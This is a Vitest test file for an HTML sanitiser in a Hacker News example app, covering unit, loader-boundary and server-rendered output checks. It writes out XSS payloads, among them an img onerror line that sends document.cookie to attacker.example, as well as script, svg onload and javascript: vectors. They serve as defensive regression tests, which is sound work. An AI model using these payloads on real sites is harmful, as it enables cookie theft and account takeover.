// @vitest-environment node
/**
 * FEL-426 — the smoke suite `coverage.manifest.json` has been claiming since
 * this example was governed.
 *
 * The manifest declares `"ci": "compile+smoke"` and lists `html` among the
 * features this example exercises. It had neither `tests/smoke.test.ts` nor
 * `vitest.config.ts`, so `scripts/build-governed-examples.ts` took the
 * no-smoke-suite branch, printed a reassuring "compile-only" line, and ran
 * nothing. The only governed example pointing an intentionally-unsafe
 * primitive at a third-party API was the one example whose lane was a no-op.
 *
 * Two layers, deliberately:
 *
 *   1. Sanitiser unit tests — pure TypeScript, no toolchain. These can never
 *      skip, so the security assertions are load-bearing on every machine.
 *   2. Served-bytes test — compiles the REAL `.aihu` source with the Rust
 *      compiler and asserts on the SSR string. This is the only layer that
 *      can catch the actual #572 regression, because it is the only one that
 *      exercises the emitter. Testing my own model of the emitter instead
 *      would be checking something other than the thing that changed.
 */

import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { transform } from '@aihu/compiler'
import { afterAll, describe, expect, it } from 'vitest'
import { sanitizeHnHtml } from '../src/lib/sanitize-hn-html.ts'

const __dirname = dirname(fileURLToPath(import.meta.url))
const exampleRoot = resolve(__dirname, '..')
const repoRoot = resolve(exampleRoot, '../..')
const SCRATCH = join(__dirname, '.scratch-smoke')

const COMPILER = ['target/release/aihu-compile', 'target/debug/aihu-compile'].find((p) =>
  existsSync(join(repoRoot, p)),
)

afterAll(() => rmSync(SCRATCH, { recursive: true, force: true }))

/**
 * The payload that reproduced the defect. `onerror` fires while the parser
 * builds the document — no interaction, no client JS of ours required.
 */
const PAYLOAD = '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)">'

describe('sanitizeHnHtml', () => {
  it('renders an injected event-handler payload inert', () => {
    const out = sanitizeHnHtml(`Interesting point. ${PAYLOAD}`)
    // The property is "no element carries an event handler" — the literal text
    // `onerror=` survives inside the escaped form and is harmless there.
    expect(out).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/)
    expect(out).not.toContain('<img')
    expect(out).toContain('&lt;img')
    expect(out).toContain('Interesting point.')
  })

  it.each([
    ['<script>alert(1)</script>', '<script'],
    ['<svg onload=alert(1)>', '<svg'],
    ['<iframe src="javascript:alert(1)">', '<iframe'],
    ['<body onload=alert(1)>', '<body'],
    ['<a href="javascript:alert(1)">x</a>', 'javascript:alert(1)"'],
  ])('neutralises %s', (input, forbidden) => {
    expect(sanitizeHnHtml(input)).not.toContain(forbidden)
  })

  it("preserves HN's real formatting vocabulary", () => {
    const out = sanitizeHnHtml('<p>para</p><i>em</i><pre><code>code</code></pre>')
    expect(out).toBe('<p>para</p><i>em</i><pre><code>code</code></pre>')
  })

  it('keeps http(s) anchors live and adds rel hardening', () => {
    const out = sanitizeHnHtml('<a href="https://example.com" rel="nofollow">link</a>')
    expect(out).toContain('<a href="https://example.com" rel="nofollow noopener noreferrer">')
    expect(out).toContain('</a>')
  })

  it('leaves a non-http scheme escaped rather than linked', () => {
    expect(sanitizeHnHtml('<a href="data:text/html,<script>">x</a>')).not.toContain('<a href=')
  })

  it('does not double-encode entities the API already escaped', () => {
    expect(sanitizeHnHtml('a &lt; b &amp; c')).toBe('a &lt; b &amp; c')
  })

  it('escapes a bare ampersand that is not an entity', () => {
    expect(sanitizeHnHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
  })

  it('treats null/undefined/empty as empty string', () => {
    expect(sanitizeHnHtml(undefined)).toBe('')
    expect(sanitizeHnHtml(null)).toBe('')
    expect(sanitizeHnHtml('')).toBe('')
  })
})

/**
 * The layer that proves the sanitiser is WIRED IN, not merely present.
 *
 * Without these, deleting the `sanitizeHnHtml(...)` call from a loader leaves
 * every other test in this file green — the unit tests would still exercise the
 * function directly, and the SSR test feeds it by hand. Asserting the trust
 * boundary is actually on the data path is the difference between "the code
 * exists" and "the fix works".
 */
describe('loader trust boundary', () => {
  const PAYLOAD_TEXT = `Nice. ${PAYLOAD}`

  function stubFetch(payload: unknown) {
    const original = globalThis.fetch
    globalThis.fetch = (async () => ({ json: async () => payload })) as unknown as typeof fetch
    return () => {
      globalThis.fetch = original
    }
  }

  it('item loader sanitises story.text on the way in', async () => {
    const restore = stubFetch({ id: 1, type: 'story', by: 'a', text: PAYLOAD_TEXT, time: 0 })
    try {
      const { loader } = await import('../src/pages/item/[id].loader.ts')
      const out = await loader.fn({ params: { id: '1' } } as never)
      expect(out.story.text).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/)
      expect(out.story.text).toContain('&lt;img')
      expect(out.story.text).toContain('Nice.')
    } finally {
      restore()
    }
  })

  it('user loader sanitises user.about on the way in', async () => {
    const restore = stubFetch({ id: 'u', created: 0, karma: 1, about: PAYLOAD_TEXT })
    try {
      const { loader } = await import('../src/pages/user/[id].loader.ts')
      const out = await loader.fn({ params: { id: 'u' } } as never)
      expect(out.user.about).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/)
      expect(out.user.about).toContain('&lt;img')
    } finally {
      restore()
    }
  })
})

/**
 * The layer that actually guards #572. Skipped only when no Rust compiler has
 * been built — and in CI, where the governed lane stages one before running
 * this, a missing binary is a FAILURE rather than a skip. A gate that quietly
 * degrades to nothing is the exact bug this file exists to close.
 */
describe('served bytes (SSR)', () => {
  it('has a compiler available in CI', () => {
    if (process.env.CI && !COMPILER) {
      throw new Error(
        'No aihu-compile binary. The governed lane must stage one before this suite; ' +
          'skipping here would make the served-bytes assertion vacuous.',
      )
    }
    expect(true).toBe(true)
  })

  it.skipIf(!COMPILER)('renders a comment payload inert in the served bytes', async () => {
    const source = readFileSync(join(exampleRoot, 'src/components/hn-comment.aihu'), 'utf-8')
    const { code } = transform(source, 'src/components/hn-comment.aihu', { target: 'server' })

    mkdirSync(SCRATCH, { recursive: true })
    const file = join(SCRATCH, 'hn-comment.ssr.ts')
    writeFileSync(
      file,
      code
        .replaceAll("'@aihu/arbor'", `'${repoRoot}/packages/arbor/src/index.ts'`)
        .replaceAll("'@aihu/runtime/ssr'", `'${repoRoot}/packages/runtime/src/ssr-string.ts'`)
        .replaceAll("'@aihu/runtime'", `'${repoRoot}/packages/runtime/src/index.ts'`)
        .replaceAll("'@aihu/signals'", `'${repoRoot}/packages/signals/src/index.ts'`)
        .replaceAll("'@aihu/router'", `'${repoRoot}/packages/router/src/index.ts'`),
    )

    const mod = (await import(/* @vite-ignore */ file)) as {
      __ssrString: (p?: Record<string, unknown>, o?: { hydratable?: boolean }) => string
    }

    // Through the loader's trust boundary, exactly as the route does.
    const comment = {
      id: 1,
      by: 'attacker',
      text: sanitizeHnHtml(`Interesting point. ${PAYLOAD}`),
      time: Math.floor(Date.now() / 1000) - 3600,
      children: [],
    }

    const bytes = mod.__ssrString({ comment }, { hydratable: true })

    // Assert the PROPERTY, not a substring. `onerror=` still occurs in the
    // output — inside `&lt;img src=x onerror=&quot;…`, which is inert text, not
    // an attribute. A naive `not.toContain('onerror=')` fails on correct output
    // and would push the next reader toward weakening the sanitiser to satisfy
    // it. What actually matters: no element tag carrying an event handler.
    expect(bytes).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/)
    expect(bytes).not.toContain('<img')
    expect(bytes).not.toContain('<script')

    // Positive assertions — without these, a sanitiser that returned '' would
    // pass every check above.
    expect(bytes).toContain('Interesting point.')
    expect(bytes).toContain('&lt;img')
  })
})
